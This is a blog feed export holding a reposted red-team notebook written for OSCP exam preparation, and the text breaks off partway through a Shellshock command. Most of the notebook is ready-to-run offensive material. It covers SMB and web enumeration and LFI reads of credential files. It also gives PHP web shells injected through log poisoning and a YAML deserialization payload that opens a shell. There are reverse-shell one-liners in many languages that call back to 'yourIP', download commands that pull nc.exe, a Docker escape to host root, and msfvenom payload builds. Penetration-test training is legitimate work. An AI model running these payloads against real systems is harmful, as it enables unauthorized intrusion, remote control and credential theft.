{
    "version": "https://jsonfeed.org/version/1",
    "title": "Or0kit • All posts by \"redteam\" tag",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Or0kit.github.io",
    "items": [
        {
            "id": "https://or0kit.github.io/PenetrationTest/Reference/redteam-notebook/",
            "url": "https://or0kit.github.io/PenetrationTest/Reference/redteam-notebook/",
            "title": "redteam-notebook【转】",
            "date_published": "2021-01-18T07:58:06.000Z",
            "content_html": "<h1 id=\"redteam-notebook\"><a class=\"anchor\" href=\"#redteam-notebook\">#</a> redteam-notebook</h1>\n<p>Collection of commands, tips and tricks and references I found useful during preparation for OSCP exam.</p>\n<h2 id=\"early-enumeration-generic\"><a class=\"anchor\" href=\"#early-enumeration-generic\">#</a> Early Enumeration - generic</h2>\n<h3 id=\"network-wide-scan-first-steps\"><a class=\"anchor\" href=\"#network-wide-scan-first-steps\">#</a> Network wide scan - first steps</h3>\n<p><code>nmap -sn 10.11.1.0/24</code></p>\n<h3 id=\"netbios-scan\"><a class=\"anchor\" href=\"#netbios-scan\">#</a> netbios scan</h3>\n<p><code>nbtscan -r 10.11.1.0/24</code></p>\n<h3 id=\"dns-recon\"><a class=\"anchor\" href=\"#dns-recon\">#</a> DNS recon</h3>\n<p><code>dnsrecon -r 10.11.1.0/24 -n &lt;DNS IP&gt;</code></p>\n<h3 id=\"scan-specific-target-with-nmap\"><a class=\"anchor\" href=\"#scan-specific-target-with-nmap\">#</a> Scan specific target with nmap</h3>\n<p><code>nmap -sV -sT -p- &lt;target IP&gt; </code></p>\n<h3 id=\"guess-os-using-xprobe2\"><a class=\"anchor\" href=\"#guess-os-using-xprobe2\">#</a> Guess OS using xprobe2</h3>\n<p><code>xprobe2 &lt;target IP&gt;</code></p>\n<h3 id=\"check-netbios-vulns\"><a class=\"anchor\" href=\"#check-netbios-vulns\">#</a> Check Netbios vulns</h3>\n<p><code>nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target</code></p>\n<h3 id=\"search-for-smb-vulns\"><a class=\"anchor\" href=\"#search-for-smb-vulns\">#</a> Search for SMB vulns</h3>\n<p><code>nmap -p139,445 &lt;target IP&gt; --script smb-vuln*</code></p>\n<h3 id=\"enumerate-using-smb-null-session\"><a class=\"anchor\" href=\"#enumerate-using-smb-null-session\">#</a> Enumerate using SMB (null session)</h3>\n<p><code>enum4linux -a &lt;target IP&gt;</code></p>\n<h3 id=\"enumerate-using-smb-wuser-pass\"><a class=\"anchor\" href=\"#enumerate-using-smb-wuser-pass\">#</a> Enumerate using SMB (w/user &amp; pass)</h3>\n<p><code>enum4linux -a -u &lt;user&gt; -p &lt;passwd&gt; &lt;targetIP&gt;</code></p>\n<h2 id=\"website-enumeration\"><a class=\"anchor\" href=\"#website-enumeration\">#</a> Website Enumeration</h2>\n<h3 id=\"quick-enumeration-using-wordlist\"><a class=\"anchor\" href=\"#quick-enumeration-using-wordlist\">#</a> quick enumeration using wordlist</h3>\n<p><code>gobuster -u http://&lt;target IP&gt; -w /usr/share/dirb/wordlists/big.txt</code></p>\n<h3 id=\"enumeration-and-basic-vuln-scan-of-a-website\"><a class=\"anchor\" href=\"#enumeration-and-basic-vuln-scan-of-a-website\">#</a> enumeration and basic vuln scan of a website</h3>\n<p><code>nikto -host http://&lt;target IP&gt;</code></p>\n<h2 id=\"website-tips-and-tricks\"><a class=\"anchor\" href=\"#website-tips-and-tricks\">#</a> Website tips and tricks</h2>\n<h3 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h3>\n<ul>\n<li>Unsafe YAML parsing may allow creation of Python objects and as a result remote code execution</li>\n</ul>\n<pre><code>!!python/object/apply:os.system [&quot;bash -i &gt;&amp; /dev/tcp/yourIP/4444 0&gt;&amp;1&quot;]\n</code></pre>\n<h3 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h3>\n<ul>\n<li>Check for LFI</li>\n</ul>\n<p>Add  <code>/etc/passwd%00</code>  to any GET/POST arguments. On windows try  <code>C:\\Windows\\System32\\drivers\\etc\\hosts%00</code>  or  <code>C:\\autoexec.bat%00</code> .<br />\nA quick win could also be any of these files  <code>c:\\sysprep.inf</code> ,  <code>c:\\sysprep\\sysprep.xml</code>  or  <code>c:\\unattend.xml</code>  as they would contain local admin credentials. On linux it's worth checking  <code>/proc/self/environ</code>  to see if there are any credentials passed to the running process via env vars.</p>\n<ul>\n<li>Fetching .php files via LFI</li>\n</ul>\n<p><code>/index.php?somevar=php://filter/read=convert.base64-encode/resource=&lt;file path&gt;%00</code>  this will return base64 encoded PHP file. Good for fishing up  <code>config.php</code>  or similar.</p>\n<ul>\n<li>\n<p>Abusing /proc/self/environ LFI to gain reverse shell<br />\nIn some situations it's possible to abuse  <code>/proc/self/environ</code>  to execute a command. For example:<br />\n <code>index.php?somevar=/proc/self/environ&amp;cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;your IP&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>\n</li>\n<li>\n<p>Apache access.log + LFI = PHP injection<br />\nIf Apache logs can be accessed via LFI it may be possible to use it to our advantage by injecting any PHP code in it and then viewing it via LFI.</p>\n</li>\n</ul>\n<p>with netcat send a request like this:</p>\n<pre><code>GET /&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;\n\n</code></pre>\n<ul>\n<li>\n<p>auth.log + LFI<br />\n <code>ssh &lt;?php system($_GET[&quot;cmd&quot;]);?&gt;@targetIP</code>  and then LFI  <code>/var/log/auth.log</code></p>\n</li>\n<li>\n<p>/var/mail + LFI<br />\n <code>mail -s &quot;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&quot; someuser@targetIP &lt; /dev/null</code></p>\n</li>\n<li>\n<p>php expect<br />\n <code>index.php?somevar=expect://ls</code></p>\n</li>\n<li>\n<p>php input<br />\n <code>curl -X POST &quot;targetIP/index.php?somevar=php://input&quot; --data '&lt;?php system(&quot;curl -o cmd.php yourIP/cmd.txt&quot;);?&gt;'</code> <br />\nThen access  <code>targetIP/cmd.php</code></p>\n</li>\n</ul>\n<h3 id=\"coldfusion\"><a class=\"anchor\" href=\"#coldfusion\">#</a> ColdFusion</h3>\n<ul>\n<li>\n<p>is it Enterprise or Community?<br />\nCheck how it handles  <code>.jsp</code>  files   <code>curl targetIP/blah/blah.jsp</code> . If 404 - enterprise, 500 - community.</p>\n</li>\n<li>\n<p>which version?<br />\n <code>/CFIDE/adminapi/base.cfc?wsdl</code>  has a useful comment indicating exact version</p>\n</li>\n<li>\n<p>common XEE<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHktYXNzZXNzbWVudC5jb20vZmlsZXMvYWR2aXNvcmllcy8yMDEwLTAyLTIyX011bHRpcGxlX0Fkb2JlX1Byb2R1Y3RzLVhNTF9FeHRlcm5hbF9FbnRpdHlfYW5kX1hNTF9JbmplY3Rpb24ucGRm\">https://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf</span></p>\n</li>\n<li>\n<p>LFI in admin login locale<br />\n <code>/CFIDE/administrator/enter.cfm?locale=../../../../ColdFusion9\\lib\\password.properties</code>  - may need full path. They can be obtained with help of   <code>/CFIDE/componentutils/cfexplorer.cfc</code></p>\n</li>\n<li>\n<p>Local upload and execution<br />\nOnce access to admin panel is gained it's possible to use the task scheduler to download a file and use a system probe to execute it.</p>\n</li>\n</ul>\n<p><code>Debugging &amp; Logging</code>  -&gt;  <code>Scheduled Tasks</code>  -&gt; url=<path to our executable>, Publish - save output to file (some writable path). Then manually execute this task which will download and save our file.</p>\n<p>To execute it create a probe  <code>Debugging &amp; Logging</code>  -&gt;  <code>System probes</code>  -&gt; URL=<some URL>, Probe fail - fail if probe does not contain &quot;blahblah&quot;, Execute program <path to our downloaded exe>. And then run probe manually.</p>\n<ul>\n<li>\n<p>Files worth grabbing</p>\n<ul>\n<li>CF7 \\lib\\neo-query.xml</li>\n<li>CF8 \\lib\\neo-datasource.xml</li>\n<li>CF9 \\lib\\neo-datasource.xml</li>\n</ul>\n</li>\n<li>\n<p>Simple remote CFM shell</p>\n</li>\n</ul>\n<pre><code>&lt;html&gt;\n&lt;body&gt;\n&lt;cfexecute name = &quot;#URL.runme#&quot; arguments =\n&quot;#URL.args#&quot; timeout = &quot;20&quot;&gt;\n&lt;/cfexecute&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<ul>\n<li>Simple remote shell using Java (if CFEXECUTE is disabled)</li>\n</ul>\n<pre><code>&lt;cfset runtime = createObject(&quot;java&quot;,\n&quot;java.lang.System&quot;)&gt;\n&lt;cfset props = runtime.getProperties()&gt;\n&lt;cfdump var=&quot;#props#&quot;&gt;\n&lt;cfset env = runtime.getenv()&gt;\n&lt;cfdump var=&quot;#env#&quot;&gt;\n</code></pre>\n<h3 id=\"dir-busting\"><a class=\"anchor\" href=\"#dir-busting\">#</a> dir busting</h3>\n<ul>\n<li>\n<p>generic dirbusting<br />\n <code>gobuster -u targetIP -w /usr/share/dirb/wordlists/big.txt</code></p>\n</li>\n<li>\n<p>fuzz some cgi<br />\n <code>gobuster -u targetIP -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s 200</code></p>\n</li>\n</ul>\n<h2 id=\"reverse-shell-howto\"><a class=\"anchor\" href=\"#reverse-shell-howto\">#</a> Reverse Shell Howto</h2>\n<ul>\n<li>\n<p>Bash<br />\n <code>bash -i &gt;&amp; /dev/tcp/yourIP/4444 0&gt;&amp;1</code></p>\n</li>\n<li>\n<p>Perl Linux<br />\n <code>perl -e 'use Socket;$i=&quot;yourIP&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;'</code></p>\n</li>\n<li>\n<p>Perl Windows<br />\n <code>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,&quot;yourIP:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</code></p>\n</li>\n<li>\n<p>Python<br />\n <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;yourIP&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>\n</li>\n<li>\n<p>PHP<br />\n <code>php -r '$sock=fsockopen(&quot;yourIP&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>\n</li>\n<li>\n<p>Ruby<br />\n <code>ruby -rsocket -e'f=TCPSocket.open(&quot;yourIP&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'</code></p>\n</li>\n<li>\n<p>Java (Linux)</p>\n</li>\n</ul>\n<pre><code>r = Runtime.getRuntime()\np = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/yourIP/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])\np.waitFor()\n</code></pre>\n<ul>\n<li>Groovy</li>\n</ul>\n<pre><code>String host=&quot;localhost&quot;;\nint port=8044;\nString cmd=&quot;cmd.exe&quot;;\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());\nwhile(pe.available()&gt;0)so.write(pe.read());\nwhile(si.available()&gt;0)po.write(si.read());\nso.flush();po.flush();\nThread.sleep(50);\ntry &#123;p.exitValue();\nbreak;\n&#125;catch (Exception e)&#123;&#125;&#125;;\np.destroy();\ns.close();\n\n</code></pre>\n<ul>\n<li>xterm</li>\n</ul>\n<p><code>xterm -display yourIP:1</code></p>\n<p>And on your side authorize the connection with  <code>xhost +targetIp</code>  and catch it with  <code>Xnest :1</code></p>\n<ul>\n<li>socat</li>\n</ul>\n<p>Listener:<br />\n <code>socat file:`tty`,raw,echo=0 yourIP:4444</code></p>\n<p>target:<br />\n <code>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:yourIP:4444</code></p>\n<h2 id=\"interactive-shell-upgrade-tricks\"><a class=\"anchor\" href=\"#interactive-shell-upgrade-tricks\">#</a> Interactive Shell Upgrade Tricks</h2>\n<ul>\n<li>\n<p>Python (Linux)<br />\n <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' </code></p>\n</li>\n<li>\n<p>Python (Windows)<br />\n <code>c:\\python26\\python.exe -c 'import pty; pty.spawn(&quot;c:\\\\windows\\\\system32\\\\cmd.exe&quot;)' </code></p>\n</li>\n<li>\n<p>Expect</p>\n</li>\n</ul>\n<p>sh.exp</p>\n<pre><code>#!/usr/bin/expect\nspawn sh\ninteract\n</code></pre>\n<ul>\n<li>Script<br />\n <code>script /dev/null</code></li>\n</ul>\n<h2 id=\"inside-windows\"><a class=\"anchor\" href=\"#inside-windows\">#</a> Inside Windows</h2>\n<ul>\n<li>\n<p>Get version<br />\n <code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code></p>\n</li>\n<li>\n<p>Get users<br />\n <code>net users</code></p>\n</li>\n<li>\n<p>Get user info<br />\n <code>net user &lt;username&gt;</code></p>\n</li>\n<li>\n<p>Check local connections and listening ports (compare with nmap scan to see if there are any hidden ports)<br />\n <code>netstat -ano</code></p>\n</li>\n<li>\n<p>Firewall status<br />\n <code>netsh firewall show state</code> <br />\n <code>netsh firewall show config</code></p>\n</li>\n<li>\n<p>Scheduled tasks<br />\nList -  <code>schtasks /query /fo LIST /v</code> <br />\nCreate -  <code>schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR &quot;mycommands&quot;</code> <br />\nRun -  <code>schtasks /Run /TN mytask</code> <br />\nDelete -  <code>schtasks /Delete /TN mytask</code></p>\n</li>\n<li>\n<p>Running tasks<br />\nList -  <code>tasklist /SVC</code> <br />\nKill -  <code>taskkill /IM &lt;exe name&gt; /F</code> <br />\nKill -  <code>taskkill /PID &lt;pid&gt; /F</code></p>\n</li>\n<li>\n<p>Services<br />\nList -  <code>net start</code> <br />\nLong name to key name  <code>sc getkeyname &quot;long name&quot;</code> <br />\nDetails -  <code>sc qc &lt;key name&gt;</code> <br />\nConfig -  <code>sc config &lt;key name&gt; </code></p>\n</li>\n<li>\n<p>Low hanging fruits to grab</p>\n</li>\n</ul>\n<pre><code>c:\\sysprep.inf\nc:\\sysprep\\sysprep.xml\n%WINDIR%\\Panther\\Unattend\\Unattended.xml\n%WINDIR%\\Panther\\Unattended.xml\n</code></pre>\n<ul>\n<li>\n<p>Installers are running as elevated?<br />\n <code>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code> <br />\n <code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code></p>\n</li>\n<li>\n<p>Find interesting files<br />\n <code>dir /s *pass* == *cred* == *vnc* == *.config*</code> <br />\n <code>findstr /si password *.xml *.ini *.txt</code></p>\n</li>\n<li>\n<p>Find interesting registry entries<br />\n <code>reg query HKLM /f password /t REG_SZ /s</code> <br />\n <code>reg query HKCU /f password /t REG_SZ /s</code></p>\n</li>\n<li>\n<p>Permissions<br />\nCheck detail on service -  <code>accesschk.exe /accepteula -ucqv &lt;service name&gt;</code> <br />\nFind modifiable services -  <code>accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</code> <br />\n <code>accesschk.exe /accepteula -uwcqv &quot;Users&quot; *</code> <br />\nFolder permissions -  <code>accesschk.exe -dqv &lt;path&gt;</code> <br />\n <code>cacls &lt;path&gt;</code> <br />\n <code>icacls &lt;path\\file</code></p>\n</li>\n<li>\n<p>Qick win on WinXP SP0/1<br />\n <code>sc config upnphost binpath= &quot;C:\\nc.exe -nv yourIP 4444 -e C:\\WINDOWS\\System32\\cmd.exe&quot;</code> <br />\n <code>sc config upnphost obj= &quot;.\\LocalSystem&quot; password= &quot;&quot;</code> <br />\n <code>sc config upnphost depend= &quot;&quot;</code> <br />\n <code>net stop upnphost</code> <br />\n <code>net start upnphost</code></p>\n</li>\n<li>\n<p>Quick wins<br />\n <code>reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot;</code> <br />\n <code>reg query &quot;HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP&quot;</code> <br />\n <code>reg query&quot; HKCU\\Software\\SimonTatham\\PuTTY\\Sessions&quot;</code> <br />\n <code>reg query &quot;HKCU\\Software\\ORL\\WinVNC3\\Password&quot;</code></p>\n</li>\n<li>\n<p>Download file with VBS</p>\n</li>\n</ul>\n<pre><code>dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)\ndim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)\nxHttp.Open &quot;GET&quot;, &quot;http://yourIp/nc.exe&quot;, False\nxHttp.Send\n\nwith bStrm\n    .type = 1 \\'//binary\n    .open\n    .write xHttp.responseBody\n    .savetofile &quot;C:\\\\Users\\\\Public\\\\nc.exe&quot;, 2 \\'//overwrite\nend with\n</code></pre>\n<ul>\n<li>\n<p>Download with Powershell 3+<br />\n <code>powershell -NoLogo -Command &quot;Invoke-WebRequest -Uri 'https://yourIP/nc.exe' -OutFile 'c:\\Users\\Public\\Downloads\\nc.exe'&quot;</code></p>\n</li>\n<li>\n<p>Download with Powershell 2<br />\n <code>powershell -NoLogo -Command &quot;$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('https://yourIP/nc.exe', 'c:\\Users\\Public\\Download\\nc.exe')&quot;</code></p>\n</li>\n<li>\n<p>Download with Python<br />\n <code>c:\\Python26\\python.exe -c &quot;import urllib; a=open('nc.exe', 'wb'); a.write(urllib.urlopen('http://yourIP/nc.exe').read()); a.flush();a.close()&quot; </code></p>\n</li>\n<li>\n<p>Windows specific LPE vulns</p>\n</li>\n</ul>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTExOTkv\">https://www.exploit-db.com/exploits/11199/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTgxNzYv\">https://www.exploit-db.com/exploits/18176/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTU2MDkv\">https://www.exploit-db.com/exploits/15609/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQyMjY5L2V4cGxvaXQ=\">https://www.securityfocus.com/bid/42269/exploit</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHlmb2N1cy5jb20vYmlkLzQ2MTM2L2V4cGxvaXQ=\">https://www.securityfocus.com/bid/46136/exploit</span></li>\n</ul>\n<h2 id=\"inside-linux\"><a class=\"anchor\" href=\"#inside-linux\">#</a> Inside Linux</h2>\n<ul>\n<li>Basic enumeration</li>\n</ul>\n<p>System info<br />\n <code>uname -a</code></p>\n<p>Arch<br />\n <code>uname -m</code></p>\n<p>Kernel<br />\n <code>cat /proc/version\t</code></p>\n<p>Distro<br />\n <code>cat /etc/*-release</code>  or  <code>cat /etc/issue</code></p>\n<p>Filesystem<br />\n <code>df -a\t</code></p>\n<p>Users<br />\n <code>cat /etc/passwd</code></p>\n<p>Groups<br />\n <code>cat /etc/group</code></p>\n<p>Super accounts<br />\n <code>grep -v -E &quot;^#&quot; /etc/passwd | awk -F: '$3 == 0 &#123; print $1&#125;'</code></p>\n<p>Currently logged in<br />\n <code>finger</code> ,  <code>w</code> ,  <code>who -a</code> ,  <code>pinky</code> ,  <code>users</code></p>\n<p>Last logged users<br />\n <code>last</code> ,  <code>lastlog</code></p>\n<p>Cheeky test -<br />\n <code>sudo -l</code></p>\n<p>Anything interesting we can run as sudo?<br />\n <code>sudo -l 2&gt;/dev/null | grep -w 'nmap|perl|awk|find|bash|sh|man|more|less|vi|vim|nc|netcat|python|ruby|lua|irb' | xargs -r ls -la 2&gt;/dev/null</code></p>\n<p>History -<br />\n <code>history</code></p>\n<p>Env vars<br />\n <code>env</code></p>\n<p>Available shells<br />\n <code>cat /etc/shells\t</code></p>\n<p>SUID files<br />\n <code>find / -perm -4000 -type f 2&gt;/dev/null</code></p>\n<p>SUID owned by root<br />\n <code>find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</code></p>\n<p>GUID files<br />\n <code>find / -perm -2000 -type f 2&gt;/dev/null\t</code></p>\n<p>World writable<br />\n <code>find / -perm -2 -type f 2&gt;/dev/null</code></p>\n<p>World writable executed<br />\n <code>find / ! -path &quot;*/proc/*&quot; -perm -2 -type f -print 2&gt;/dev/null\t</code></p>\n<p>World writable dirs<br />\n <code>find / -perm -2 -type d 2&gt;/dev/null</code></p>\n<p>rhost files<br />\n <code>find /home –name *.rhosts -print 2&gt;/dev/null\t</code></p>\n<p>Plan files<br />\n <code>find /home -iname *.plan -exec ls -la &#123;&#125; ; -exec cat &#123;&#125; 2&gt;/dev/null ;\t</code></p>\n<p>hosts.equiv<br />\n <code>find /etc -iname hosts.equiv -exec ls -la &#123;&#125; 2&gt;/dev/null ; -exec cat &#123;&#125; 2&gt;/dev/null ;\t</code></p>\n<p>Can we peek at /root?<br />\n <code>ls -ahlR /root/\t</code></p>\n<p>Find ssh files<br />\n <code>find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls -la</code></p>\n<p>Inetd<br />\n <code>ls -la /usr/sbin/in.*\t</code></p>\n<p>Grep logs for loot<br />\n <code>grep -l -i pass /var/log/*.log 2&gt;/dev/null\t</code></p>\n<p>What do we have in logs<br />\n <code>find /var/log -type f -exec ls -la &#123;&#125; ; 2&gt;/dev/null\t</code></p>\n<p>Find conf files in /etc<br />\n <code>find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la &#123;&#125; ; 2&gt;/dev/null\t</code></p>\n<p>as above<br />\n <code>ls -la /etc/*.conf\t</code></p>\n<p>List open files<br />\n <code>lsof -i -n\t</code></p>\n<p>Can we read root mail?<br />\n <code>head /var/mail/root\t</code></p>\n<p>What is running as root?<br />\n <code>ps aux | grep root\t</code></p>\n<p>Lookup paths to running files<br />\n <code>ps aux | awk '&#123;print $11&#125;'|xargs -r ls -la 2&gt;/dev/null |awk '!x[$0]++'</code></p>\n<p>Exports and permissions of NFS<br />\n <code>ls -la /etc/exports 2&gt;/dev/null; cat /etc/exports 2&gt;/dev/null\t</code></p>\n<p>List sched jobs<br />\n <code>ls -la /etc/cron*\t</code></p>\n<p>List open connections (run with sudo/as root for more results)<br />\n <code>lsof -i</code></p>\n<p>Installed pkgs:<br />\n <code>dpkg -l</code>  (debian),  <code>rpm -qa</code>  (RH)</p>\n<p>sudo version?<br />\n <code>sudo -V</code></p>\n<p>Available compilers<br />\n <code>dpkg --list 2&gt;/dev/null| grep compiler |grep -v decompiler 2&gt;/dev/null &amp;&amp; yum list installed 'gcc*' 2&gt;/dev/null| grep gcc 2&gt;/dev/null</code></p>\n<h3 id=\"docker-tips\"><a class=\"anchor\" href=\"#docker-tips\">#</a> Docker tips</h3>\n<p>Since most likely Docker runs as root if you can execute docker commands as unpriviledged user you can very likely use Docker's privs instead.</p>\n<p><code>docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash</code>  - note that the root folder from host is mounted as  <code>/host</code> . You'll also see all processes running on host and be connected to same NICs.</p>\n<p>You may want to look into escaping UTS and IPC namespacing with  <code>--uts=host --ipc=host</code></p>\n<h3 id=\"upload-files-using-curl-with-webdav\"><a class=\"anchor\" href=\"#upload-files-using-curl-with-webdav\">#</a> Upload files using cUrl with WebDAV</h3>\n<pre><code>curl -T nc.exe http://targetIP/nc.txt\ncurl -X MOVE -v -H &quot;Destination:http://targetIP/nc.exe&quot; http://targetIP/nc.txt\n</code></pre>\n<h2 id=\"msfvenom\"><a class=\"anchor\" href=\"#msfvenom\">#</a> msfvenom</h2>\n<h3 id=\"list-payloads\"><a class=\"anchor\" href=\"#list-payloads\">#</a> List payloads</h3>\n<p>msfvenom -l</p>\n<h3 id=\"binaries\"><a class=\"anchor\" href=\"#binaries\">#</a> Binaries</h3>\n<ul>\n<li>\n<p>Linux<br />\n <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p>\n</li>\n<li>\n<p>Windows<br />\n <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p>\n</li>\n<li>\n<p>Mac<br />\n <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p>\n</li>\n</ul>\n<h3 id=\"web-payloads\"><a class=\"anchor\" href=\"#web-payloads\">#</a> Web Payloads</h3>\n<ul>\n<li>\n<p>PHP<br />\n <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</code> <br />\n <code>cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p>\n</li>\n<li>\n<p>ASP<br />\n <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p>\n</li>\n<li>\n<p>JSP<br />\n <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p>\n</li>\n<li>\n<p>WAR<br />\n <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p>\n</li>\n</ul>\n<h3 id=\"scripting-payloads\"><a class=\"anchor\" href=\"#scripting-payloads\">#</a> Scripting Payloads</h3>\n<ul>\n<li>\n<p>Python<br />\n <code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p>\n</li>\n<li>\n<p>Bash<br />\n <code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p>\n</li>\n<li>\n<p>Perl<br />\n <code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p>\n</li>\n</ul>\n<h3 id=\"shellcode\"><a class=\"anchor\" href=\"#shellcode\">#</a> Shellcode</h3>\n<p>For all shellcode see  <code>msfvenom –help-formats</code>  for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p>\n<ul>\n<li>\n<p>Linux Based Shellcode<br />\n <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>\n</li>\n<li>\n<p>Windows Based Shellcode<br />\n <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>\n</li>\n<li>\n<p>Mac Based Shellcode<br />\n <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p>\n</li>\n</ul>\n<h2 id=\"shellshock\"><a class=\"anchor\" href=\"#shellshock\">#</a> Shellshock</h2>\n<ul>\n<li>\n<p>CVE-2014-6271<br />\n <code>env X='() &#123; :; &#125;; echo &quot;CVE-2014-6271 vulnerable&quot;' bash -c id</code></p>\n</li>\n<li>\n<p>CVE-2014-7169<br />\n <code>env X='() &#123; (a)=&gt;\\' bash -c &quot;echo date&quot;; cat echo</code></p>\n</li>\n<li>\n<p>CVE-2014-7186<br />\n <code>bash -c 'true &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF' || echo &quot;CVE-2014-7186 vulnerable, 